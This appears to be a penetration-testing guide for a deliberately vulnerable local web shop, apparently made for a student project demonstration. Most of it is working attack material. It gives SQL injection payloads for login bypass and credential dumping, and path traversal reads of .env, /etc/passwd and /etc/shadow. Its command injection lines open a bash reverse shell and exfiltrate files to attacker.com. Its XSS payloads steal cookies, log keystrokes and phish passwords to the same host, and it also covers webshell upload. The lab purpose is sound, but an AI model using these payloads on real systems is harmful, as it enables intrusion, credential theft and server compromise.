# Penetration Testing Guide - Attacker's Perspective
## Complete Vulnerability Discovery & Exploitation

This guide demonstrates how a real attacker would discover and exploit vulnerabilities in this application.

---

## 🔍 Phase 1: Reconnaissance & Information Gathering

### Step 1: Identify the Application
```bash
# Check what framework/technology is being used
curl -I http://localhost:3000
# Look for: X-Powered-By, Server headers

# Check robots.txt
curl http://localhost:3000/robots.txt

# Check sitemap
curl http://localhost:3000/sitemap.xml
```

### Step 2: Map the Application Structure
```bash
# Common directories to check
/admin
/api
/login
/register
/products
/search
/cart
/checkout
```

### Step 3: Identify API Endpoints
```bash
# Check for API routes
curl http://localhost:3000/api/products
curl http://localhost:3000/api/search
curl http://localhost:3000/api/login
curl http://localhost:3000/api/backup
curl http://localhost:3000/api/view-file
curl http://localhost:3000/api/products-search
```

---

## 🎯 Phase 2: Vulnerability Discovery

### Vulnerability 1: SQL Injection in Login

#### Discovery:
1. **Identify Input Points:**
   - Found login form at `/login`
   - POST request to `/api/login`
   - Parameters: `username`, `password`

2. **Test for SQL Injection:**
   ```bash
   # Basic test
   curl -X POST http://localhost:3000/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"test"}'
   ```

3. **Confirm Vulnerability:**
   - If login succeeds with invalid password → SQL injection confirmed
   - Check server logs for SQL query execution

#### Enumeration:
```bash
# Test different payloads
# Payload 1: Basic bypass
{"username":"admin'--","password":"anything"}

# Payload 2: OR condition
{"username":"admin' OR '1'='1","password":"anything"}

# Payload 3: Comment out password
{"username":"admin'--","password":"anything"}

# Payload 4: Union-based (if possible)
{"username":"admin' UNION SELECT 1,2,3--","password":"anything"}
```

#### Exploitation:
```bash
# Step 1: Bypass authentication
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"test"}'

# Step 2: Extract session cookie
# Use the returned cookie to access admin panel

# Step 3: Access admin functions
curl http://localhost:3000/admin/home \
  -H "Cookie: adminSession=..."
```

---

### Vulnerability 2: SQL Injection in Search (Admin Panel)

#### Discovery:
1. **Identify Input Points:**
   - Found search functionality
   - GET request to `/api/search?q=<term>&scope=users`
   - `scope=users` parameter suggests admin functionality

2. **Test for SQL Injection:**
   ```bash
   # Basic test
   curl "http://localhost:3000/api/search?q=test' OR '1'='1&scope=users"
   ```

3. **Confirm Vulnerability:**
   - If returns all users → SQL injection confirmed
   - Check server console for SQL query

#### Enumeration:
```bash
# Test 1: Basic injection
curl "http://localhost:3000/api/search?q=' OR '1'='1&scope=users"

# Test 2: Extract all users
curl "http://localhost:3000/api/search?q=' OR '1'='1'--&scope=users"

# Test 3: Union-based injection
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,2,3,4,5--&scope=users"
```

#### Exploitation:
```bash
# Step 1: Extract database version
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,VERSION(),3,4,5--&scope=users"

# Step 2: Extract database name
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,DATABASE(),3,4,5--&scope=users"

# Step 3: Extract table names
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE()--&scope=users"

# Step 4: Extract column names
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--&scope=users"

# Step 5: Extract sensitive data
curl "http://localhost:3000/api/search?q=' UNION SELECT id,username,password,email,5 FROM users--&scope=users"
```

---

### Vulnerability 3: Union-Based SQL Injection in Products Search

#### Discovery:
1. **Identify Input Points:**
   - Found `/api/products-search` endpoint
   - Takes `category` parameter
   - Returns product data

2. **Test for SQL Injection:**
   ```bash
   # Basic test
   curl "http://localhost:3000/api/products-search?category=' OR '1'='1"
   ```

3. **Confirm Vulnerability:**
   - Check response for SQL query (if exposed)
   - Test with UNION SELECT payload

#### Enumeration:
```bash
# Step 1: Find column count
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,2,3--"
# If error, try different column counts
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,2,3,4--"
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,2,3,4,5--"

# Step 2: Identify which columns are displayed
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,2,3--"
# Check which numbers appear in response (those are displayed columns)
```

#### Exploitation:
```bash
# Step 1: Extract database version
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,VERSION(),3--"

# Step 2: Extract current user
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,USER(),3--"

# Step 3: Extract database name
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,DATABASE(),3--"

# Step 4: Extract table names
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=DATABASE()--"

# Step 5: Extract column names from users table
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--"

# Step 6: Extract user credentials
curl "http://localhost:3000/api/products-search?category=' UNION SELECT id,username,password FROM users--"

# Step 7: Find database configuration path
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,@@datadir,3--"
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,@@basedir,3--"
```

---

### Vulnerability 4: Local File Inclusion (LFI)

#### Discovery:
1. **Identify Input Points:**
   - Found `/api/view-file` endpoint
   - Takes `file` parameter
   - Likely used for viewing uploaded files or logs

2. **Test for LFI:**
   ```bash
   # Basic test - try to read a known file
   curl "http://localhost:3000/api/view-file?file=package.json"
   ```

3. **Test Directory Traversal:**
   ```bash
   # Test with ../ sequences
   curl "http://localhost:3000/api/view-file?file=../package.json"
   curl "http://localhost:3000/api/view-file?file=../../package.json"
   ```

#### Enumeration:
```bash
# Step 1: Map directory structure
curl "http://localhost:3000/api/view-file?file=../package.json"
curl "http://localhost:3000/api/view-file?file=../../package.json"
curl "http://localhost:3000/api/view-file?file=../../../package.json"

# Step 2: Read application files
curl "http://localhost:3000/api/view-file?file=../lib/db.js"
curl "http://localhost:3000/api/view-file?file=../.env"
curl "http://localhost:3000/api/view-file?file=../package.json"

# Step 3: Read system files (Linux)
curl "http://localhost:3000/api/view-file?file=../../etc/passwd"
curl "http://localhost:3000/api/view-file?file=../../etc/hosts"
curl "http://localhost:3000/api/view-file?file=../../proc/version"

# Step 4: Read system files (Windows)
curl "http://localhost:3000/api/view-file?file=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
curl "http://localhost:3000/api/view-file?file=..\\..\\..\\Windows\\win.ini"
```

#### Exploitation:
```bash
# Step 1: Extract database credentials
curl "http://localhost:3000/api/view-file?file=../.env"
curl "http://localhost:3000/api/view-file?file=../lib/db.js"

# Step 2: Read source code for more vulnerabilities
curl "http://localhost:3000/api/view-file?file=../pages/api/login.js"
curl "http://localhost:3000/api/view-file?file=../pages/api/backup.js"

# Step 3: Read system configuration (Linux)
curl "http://localhost:3000/api/view-file?file=../../etc/passwd"
curl "http://localhost:3000/api/view-file?file=../../etc/shadow"  # If accessible
curl "http://localhost:3000/api/view-file?file=../../etc/mysql/my.cnf"

# Step 4: Read system configuration (Windows)
curl "http://localhost:3000/api/view-file?file=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
curl "http://localhost:3000/api/view-file?file=..\\..\\..\\ProgramData\\MySQL\\MySQL Server 8.0\\my.ini"
```

---

### Vulnerability 5: Command Injection in Backup

#### Discovery:
1. **Identify Input Points:**
   - Found "Run System Backup" button in admin panel
   - POST request to `/api/backup`
   - Takes `filename` parameter

2. **Test for Command Injection:**
   ```bash
   # Basic test - try command separator
   curl -X POST http://localhost:3000/api/backup \
     -H "Content-Type: application/json" \
     -d '{"filename":"backup.tar; whoami"}'
   ```

3. **Confirm Vulnerability:**
   - Check if command executes (may need to check server logs)
   - Try to get output via other means

#### Enumeration:
```bash
# Test different command separators
# Semicolon (;)
{"filename":"backup.tar; whoami"}

# Pipe (|)
{"filename":"backup.tar | whoami"}

# Ampersand (&)
{"filename":"backup.tar & whoami"}

# Newline
{"filename":"backup.tar\nwhoami"}

# Command substitution
{"filename":"backup.tar$(whoami)"}
```

#### Exploitation:
```bash
# Step 1: System information
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -d '{"filename":"backup.tar; whoami"}'

curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -d '{"filename":"backup.tar; uname -a"}'

# Step 2: Network information
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -d '{"filename":"backup.tar; ifconfig"}'

# Step 3: File system access
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -d '{"filename":"backup.tar; cat /etc/passwd"}'

# Step 4: Reverse shell (if possible)
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -d '{"filename":"backup.tar; bash -i >& /dev/tcp/attacker.com/4444 0>&1"}'

# Step 5: Data exfiltration
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -d '{"filename":"backup.tar; curl http://attacker.com/steal?data=$(cat /etc/passwd)"}'
```

---

### Vulnerability 6: Cross-Site Scripting (XSS)

#### Discovery:
1. **Identify Input Points:**
   - Search functionality: `/search?q=<term>`
   - Product reviews: Comment field
   - Cart promo code: Promo code field
   - Home page redirect: `/?redirect=<url>`

2. **Test for XSS:**
   ```bash
   # Reflected XSS - Search
   curl "http://localhost:3000/search?q=<script>alert('XSS')</script>"
   
   # Check if script tag appears in response
   ```

3. **Confirm Vulnerability:**
   - Check page source for unescaped user input
   - Look for `dangerouslySetInnerHTML` in React code
   - Test with browser DevTools

#### Enumeration:
```bash
# Test 1: Basic script tag
/search?q=<script>alert('XSS')</script>

# Test 2: Image with onerror
/search?q=<img src=x onerror=alert('XSS')>

# Test 3: SVG with onload
/search?q=<svg onload=alert('XSS')>

# Test 4: Event handlers
/search?q=<body onload=alert('XSS')>

# Test 5: JavaScript protocol
/?redirect=javascript:alert('XSS')
```

#### Exploitation:
```bash
# Step 1: Cookie theft
/search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>

# Step 2: Keylogger
/search?q=<script>document.onkeypress=function(e){fetch('http://attacker.com/key?k='+e.key)}</script>

# Step 3: Phishing overlay
/search?q=<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999"><div style="background:white;padding:20px;margin:20% auto;width:300px"><h2>Session Expired</h2><input type="password" id="pwd" placeholder="Password"><button onclick="fetch('http://attacker.com/phish?pwd='+document.getElementById('pwd').value)">Login</button></div></div>

# Step 4: Load external script
/search?q=<script src="http://attacker.com/malicious.js"></script>
```

---

### Vulnerability 7: Unrestricted File Upload

#### Discovery:
1. **Identify Upload Functionality:**
   - Admin panel: Product image upload
   - Endpoint: `/api/upload`
   - Accepts file uploads

2. **Test File Type Restrictions:**
   ```bash
   # Try uploading different file types
   curl -X POST http://localhost:3000/api/upload \
     -F "image=@test.js"
   ```

3. **Confirm Vulnerability:**
   - Check if JS files are accepted
   - Verify file is accessible via URL
   - Test if file executes

#### Enumeration:
```bash
# Step 1: Test allowed file types
# Upload image (should work)
curl -X POST http://localhost:3000/api/upload -F "image=@test.jpg"

# Upload JavaScript (test if allowed)
curl -X POST http://localhost:3000/api/upload -F "image=@malicious.js"

# Upload HTML (test if allowed)
curl -X POST http://localhost:3000/api/upload -F "image=@webshell.html"

# Step 2: Check file accessibility
curl http://localhost:3000/uploads/[uploaded-filename].js

# Step 3: Test execution
# Via XSS or direct script tag
```

#### Exploitation:
```bash
# Step 1: Upload malicious JavaScript
curl -X POST http://localhost:3000/api/upload \
  -F "image=@browser-shell.js"

# Step 2: Get file path from response
# Response: {"success":true,"path":"/uploads/1234567890-abc123.js"}

# Step 3: Execute via XSS
/search?q=<script src="/uploads/1234567890-abc123.js"></script>

# Step 4: Upload webshell HTML
curl -X POST http://localhost:3000/api/upload \
  -F "image=@webshell.html"

# Step 5: Access webshell
curl http://localhost:3000/uploads/webshell.html
```

---

## 🎯 Phase 3: Complete Attack Chain

### Attack Scenario 1: Full System Compromise

#### Step 1: Initial Access via SQL Injection
```bash
# Bypass login
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"test"}'

# Extract session cookie
# Cookie: adminSession=admin:1234567890
```

#### Step 2: Access Admin Panel
```bash
# Use session cookie to access admin
curl http://localhost:3000/admin/home \
  -H "Cookie: adminSession=admin:1234567890"
```

#### Step 3: Command Injection via Backup
```bash
# Execute commands on server
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; whoami"}'
```

#### Step 4: Extract Database Credentials via LFI
```bash
# Read database configuration
curl "http://localhost:3000/api/view-file?file=../.env" \
  -H "Cookie: adminSession=admin:1234567890"

curl "http://localhost:3000/api/view-file?file=../lib/db.js" \
  -H "Cookie: adminSession=admin:1234567890"
```

#### Step 5: Extract All Data via SQL Injection
```bash
# Get all users
curl "http://localhost:3000/api/search?q=' UNION SELECT id,username,password,email,5 FROM users--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"

# Get all products
curl "http://localhost:3000/api/products-search?category=' UNION SELECT id,name,price FROM products--"
```

#### Step 6: Upload Backdoor
```bash
# Upload webshell
curl -X POST http://localhost:3000/api/upload \
  -H "Cookie: adminSession=admin:1234567890" \
  -F "image=@webshell.html"

# Access webshell
curl http://localhost:3000/uploads/webshell.html
```

#### Step 7: Establish Persistence
```bash
# Create reverse shell via command injection
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; bash -i >& /dev/tcp/attacker.com/4444 0>&1"}'
```

---

## 📊 Vulnerability Summary

| Vulnerability | Discovery Method | Exploitation | Impact |
|--------------|-----------------|--------------|---------|
| SQL Injection (Login) | Input fuzzing, error messages | Authentication bypass | Admin access |
| SQL Injection (Search) | Parameter testing, UNION SELECT | Data extraction | User data leak |
| SQL Injection (Products) | UNION SELECT testing | Database enumeration | Full DB access |
| LFI | Directory traversal testing | File reading | Credential theft |
| Command Injection | Command separator testing | RCE | Server compromise |
| XSS (Reflected) | Input reflection testing | Session hijacking | Account takeover |
| XSS (Stored) | Review submission testing | Persistent attack | Long-term access |
| File Upload | File type testing | Malicious file upload | Code execution |

---

## 🔧 Tools for Testing

### Manual Testing:
- **Browser DevTools**: Inspect requests/responses
- **cURL**: Command-line HTTP requests
- **Burp Suite**: Intercept and modify requests
- **SQLMap**: Automated SQL injection testing
- **DirBuster**: Directory enumeration

### Automated Tools:
```bash
# SQLMap for SQL injection
sqlmap -u "http://localhost:3000/api/login" --data="username=test&password=test" --method=POST

# Nikto for vulnerability scanning
nikto -h http://localhost:3000

# OWASP ZAP for automated scanning
```

---

## 📝 Attack Report Template

### For Each Vulnerability:

1. **Discovery:**
   - How was it found?
   - What testing method?
   - What indicated vulnerability?

2. **Enumeration:**
   - What information was gathered?
   - What payloads were tested?
   - What worked?

3. **Exploitation:**
   - Step-by-step exploitation
   - Commands used
   - Results obtained

4. **Impact:**
   - What data was accessed?
   - What systems were compromised?
   - What could an attacker do?

5. **Evidence:**
   - Screenshots
   - Request/response logs
   - Extracted data samples

---

## ✅ Complete Testing Checklist

- [ ] SQL Injection in login endpoint
- [ ] SQL Injection in search endpoint
- [ ] SQL Injection in products-search endpoint
- [ ] Local File Inclusion in view-file endpoint
- [ ] Command Injection in backup endpoint
- [ ] Reflected XSS in search page
- [ ] Stored XSS in reviews
- [ ] DOM XSS in cart promo code
- [ ] Unrestricted file upload
- [ ] Authentication bypass
- [ ] Session hijacking
- [ ] Data exfiltration
- [ ] Remote code execution

---

This guide provides a realistic attacker's perspective for your FYP demonstration! 🎯
